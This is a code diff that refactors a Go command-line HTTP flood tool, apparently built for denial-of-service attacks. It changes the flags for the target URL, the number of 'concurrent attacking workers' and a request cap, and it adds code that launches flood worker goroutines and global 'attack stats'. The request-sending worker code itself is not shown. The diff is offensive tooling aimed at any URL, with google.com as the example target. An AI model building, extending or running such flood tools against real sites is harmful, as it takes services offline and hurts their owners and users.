@@ -9,25 +9,29 @@ import (
 
 //Command line args
 var (
-	verbose = kingpin.Flag("verbose", "Verbose mode.").Short('v').Bool()
-	threads = kingpin.Flag("threads", "Amount of concurrent attacking threads.").Default("8").Short('t').Int()
-	target  = kingpin.Arg("url", "Target URL e.g http://google.com").Required().String()
+	verbose     = kingpin.Flag("verbose", "Verbose mode.").Short('v').Bool()
+	maxWorkers  = kingpin.Flag("workers", "Amount of concurrent attacking workers (threads).").Default("8").Short('w').Int()
+	maxRequests = kingpin.Flag("max-requests", "Amount requests to send before exiting.").Default("-1").Short('m').Int()
+	target      = kingpin.Arg("url", "Target URL e.g http://google.com").Required().String()
 )
 
-//Attack stats
+//Global attack stats
 var (
-	totalRequestsSent int
-	threadCounter     int
-	threadDoneCounter int
+	requestCounter    int
+	workerCounter     int
+	workerDeadCounter int
 	exitChan          chan int
+	requestChan       chan bool
+	workers           map[int]*floodWorker
 )
 
 func main() {
+
 	//Parse arguments
 	kingpin.Parse()
 	u, err := url.Parse(*target)
 	if err != nil {
-		log.Fatal(err) //URL Invalid
+		log.Fatal("URL Invalid")
 	}
 
 	if !((u.Scheme == "http") || (u.Scheme == "https")) {
@@ -37,33 +41,32 @@ func main() {
 	//Reflect arguments
 	if *verbose {
 		fmt.Printf("URL => %s\n", *target)
-		fmt.Printf("Threads => %d\n", *threads)
+		fmt.Printf("Workers => %d\n", *maxWorkers)
 	}
 
+	//Instantiate stuff
 	exitChan := make(chan int)
+	workers := map[int]*floodWorker{}
 
 	//Start flood workers
-	for threadCounter < *threads {
-		worker := floodWorker{
+	for workerCounter < *maxWorkers {
+		workers[workerCounter] = &floodWorker{
 			exitChan: exitChan,
-			id:       threadCounter,
+			id:       workerCounter,
 			target:   *u,
 		}
 
 		if *verbose {
-			fmt.Printf("Thread %x started\n", threadCounter)
+			fmt.Printf("Thread %d started\n", workerCounter)
 		}
 
-		worker.Start()
-		threadCounter += 1
+		workers[workerCounter].Start()
+		workerCounter += 1
 	}
 
-	//Wait for workers to finish before exit
-	for threadDoneCounter < *threads {
-		deadId := <- exitChan
-		if *verbose {
-			fmt.Printf("Thread %x ended\n", deadId)
-		}
-	}
-	return
+	requestChan = make(chan bool)
+
+	//Misc workers
+	go MaxRequestEnforcer()
+	WorkerOverseer()
 }
